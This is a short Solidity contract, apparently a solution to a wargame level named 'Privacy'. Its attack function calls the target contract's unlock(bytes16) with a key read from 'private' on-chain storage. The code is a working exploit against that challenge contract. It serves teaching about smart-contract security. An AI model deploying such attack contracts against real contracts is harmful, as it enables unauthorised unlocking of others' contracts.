pragma solidity ^0.4.18;

import "./levels/Privacy.sol";

contract PrivacyHack {
    // malicious attacker must pass in key because contracts
    // cannot read storage of other contracts and victim contract's 
    // state variable "bytes32[3] private data;" does not have a getter
    function attack(address _target, bytes16 _key) public {
        Privacy target = Privacy(_target);
        target.call(bytes4(keccak256("unlock(bytes16)")), _key);
    }
}